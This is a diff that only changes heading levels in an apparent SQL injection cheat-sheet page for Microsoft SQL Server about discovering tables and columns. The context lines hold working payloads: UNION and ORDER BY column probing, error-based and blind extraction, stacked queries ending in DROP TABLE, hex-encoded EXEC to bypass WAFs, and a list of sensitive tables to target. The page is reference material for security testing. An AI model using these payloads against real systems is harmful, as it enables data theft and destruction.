@@ -7,15 +7,13 @@ tags: ["tables", "columns", "schema discovery"]
 lastUpdated: 2025-03-15
 ---
 
-## Tables and Columns
-
 Discovering table and column information is a crucial step in SQL injection attacks against Microsoft SQL Server. This knowledge allows for targeted data extraction and more advanced exploitation.
 
-### Determining Number of Columns
+## Determining Number of Columns
 
 Before extracting table information, you need to determine the number of columns in the current query result set.
 
-#### Using ORDER BY
+### Using ORDER BY
 
 ```sql
 -- Incrementally increase the number until you get an error
@@ -25,7 +23,7 @@ ORDER BY 3-- (Valid)
 ORDER BY n-- (Error when n is greater than the number of columns)
 ```
 
-#### Using UNION SELECT NULL
+### Using UNION SELECT NULL
 
 ```sql
 -- Incrementally try different numbers of NULLs
@@ -34,14 +32,14 @@ ORDER BY n-- (Error when n is greater than the number of columns)
 ' UNION SELECT NULL,NULL,NULL-- -- Works if query has exactly 3 columns
 ```
 
-#### Using ERROR Messages
+### Using ERROR Messages
 
 ```sql
 -- Using HAVING clause to extract column count
 HAVING 1=1--           -- Error message can indicate column count
 ```
 
-#### Using GROUP BY/HAVING Method
+### Using GROUP BY/HAVING Method
 
 This technique incrementally discovers column names through error messages:
 
@@ -59,11 +57,11 @@ This technique incrementally discovers column names through error messages:
 -- Continue until no more errors
 ```
 
-### Information Schema Views
+## Information Schema Views
 
 SQL Server provides standardized INFORMATION_SCHEMA views for metadata discovery:
 
-#### Listing Tables
+### Listing Tables
 
 ```sql
 -- List all tables in the current database
@@ -75,7 +73,7 @@ FROM information_schema.tables
 ORDER BY table_schema, table_name
 ```
 
-#### Listing Columns
+### Listing Columns
 
 ```sql
 -- List all columns for a specific table
@@ -89,11 +87,11 @@ FROM information_schema.columns
 ORDER BY table_name, ordinal_position
 ```
 
-### System Catalog Views
+## System Catalog Views
 
 SQL Server's system catalog views provide more detailed metadata:
 
-#### Tables via sys.tables and sys.objects
+### Tables via sys.tables and sys.objects
 
 ```sql
 -- List user tables using sys.tables
@@ -103,7 +101,7 @@ SELECT name, create_date FROM sys.tables ORDER BY name
 SELECT name FROM sys.objects WHERE type = 'U' ORDER BY name
 ```
 
-#### Columns via sys.columns
+### Columns via sys.columns
 
 ```sql
 -- Get columns for a specific table
@@ -119,7 +117,7 @@ WHERE o.type = 'U'
 ORDER BY o.name, c.column_id
 ```
 
-### Legacy System Tables (SQL Server 2000 and earlier)
+## Legacy System Tables (SQL Server 2000 and earlier)
 
 ```sql
 -- List user tables
@@ -134,7 +132,7 @@ JOIN sysobjects o ON c.id = o.id
 WHERE o.name = 'users'
 ```
 
-### String Concatenation for Multiple Results
+## String Concatenation for Multiple Results
 
 When you can only return a single value, use concatenation:
 
@@ -149,7 +147,7 @@ SELECT STUFF((
 ), 1, 1, '')
 ```
 
-### Legacy Bulk Extraction (Temporary Tables)
+## Legacy Bulk Extraction (Temporary Tables)
 
 For older versions or when XML functions are unavailable, you can use a temporary table to iterate through data:
 
@@ -172,9 +170,9 @@ AND 1=0; DROP TABLE TMP_DB;
 
 **Important:** This technique requires stacked queries (multiple statements separated by `;`) and a persistent connection where the temporary table survives between requests. It does not work with simple UNION-based injection or environments where each query runs in isolation.
 
-### Practical Injection Examples
+## Practical Injection Examples
 
-#### UNION Attack for Tables
+### UNION Attack for Tables
 
 ```sql
 -- Basic UNION attack to get table names
@@ -192,7 +190,7 @@ AND 1=0; DROP TABLE TMP_DB;
 ' UNION SELECT NULL, table_name + '.' + column_name, NULL FROM information_schema.columns--
 ```
 
-#### Error-Based Extraction
+### Error-Based Extraction
 
 ```sql
 -- Using error-based extraction for table names
@@ -218,7 +216,7 @@ AND 1=0; DROP TABLE TMP_DB;
 
 This accumulating exclusion pattern is most effective when the injection produces visible output (error-based, UNION-based, or direct result display) so the attacker can observe each returned value. In fully blind contexts where no output is visible, use boolean-based or time-based techniques instead (see Blind Extraction below).
 
-#### Hex Encoding for WAF Bypass
+### Hex Encoding for WAF Bypass
 
 Hex encoding can bypass simple keyword-based WAFs that block strings like `SELECT` or `FROM`. The actual SQL keywords are hidden inside a hex literal, decoded at runtime via `CAST`, and executed dynamically with `EXEC`:
 
@@ -229,7 +227,7 @@ Hex encoding can bypass simple keyword-based WAFs that block strings like `SELEC
 
 **Note:** This requires stacked queries support. The hex string itself passes through the WAF undetected, but `DECLARE`, `CAST`, and `EXEC` keywords may still be blocked by more sophisticated filters.
 
-#### Blind Extraction
+### Blind Extraction
 
 ```sql
 -- Check first character of first table name
@@ -237,7 +235,7 @@ Hex encoding can bypass simple keyword-based WAFs that block strings like `SELEC
 -- Where 117 is ASCII for 'u'
 ```
 
-### Database Link Traversal
+## Database Link Traversal
 
 For linked servers, you can query tables across servers:
 
@@ -249,7 +247,7 @@ SELECT * FROM [linked_server].master.information_schema.tables
 SELECT * FROM [linked_server].[database].[schema].[table]
 ```
 
-### System Tables to Target
+## System Tables to Target
 
 Common interesting tables to look for:
 
@@ -262,7 +260,7 @@ Common interesting tables to look for:
 | config, settings         | Configuration data   | setting_name, setting_value        |
 | employees, staff         | Employee information | name, salary, position             |
 
-### Notes
+## Notes
 
 1. Some system tables and views require elevated privileges
 2. Information schema views are more standard across database systems
